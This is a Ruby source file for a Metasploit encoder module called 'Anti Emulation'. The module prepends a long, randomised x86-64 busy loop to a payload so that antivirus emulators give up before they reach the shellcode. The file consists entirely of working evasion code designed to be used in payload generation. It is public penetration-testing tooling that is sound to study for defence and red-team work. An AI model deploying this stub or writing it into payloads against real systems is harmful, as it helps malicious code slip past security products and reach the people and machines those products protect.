require 'metasm'
require 'msf/core'

class MetasploitModule < Msf::Encoder

    Rank = ManualRanking

    def initialize
        super(
            'Name'             => 'Anti Emulation',
            'Version'          => '$Revision: 14774 $',
            'Description'      => 'One loop to rule them all',
            'Author'           => 'a five years old child',
            'Arch'             => ARCH_X86_64,
            'License'          => MSF_LICENSE,
            'EncoderType'      => Msf::Encoder::Type::Raw
            )
    end

    @@cpu64 = Metasm::X86_64.new
    def assemble(src, cpu=@@cpu64)
        Metasm::Shellcode.assemble(cpu, src).encode_string
    end

    def can_preserve_registers?
        true
    end

    def modified_registers
        []
    end

    def preserves_stack?
        true
    end

    def encode_block(state, block)
        nb_iter = rand(0x2fffffff)+0xfffffff

        push_registers = assemble("push rax")
        pop_registers  = assemble("pop rax")
        if datastore['SaveRegisters']
            datastore['SaveRegisters'].split(" ").each { |reg|
                push_registers += assemble("push %s"%reg)
                pop_registers   = assemble("pop %s"%reg) + pop_registers
            }
        end
        anti_emu_stub =  assemble("mov ecx, 0x%016x"%nb_iter)
        loop_code = assemble("xor rax, rbx")
        anti_emu_stub += loop_code
        anti_emu_stub += "\xe2"+(0x100-(loop_code.length+2)).chr


        return push_registers + anti_emu_stub + pop_registers + block
    end

end
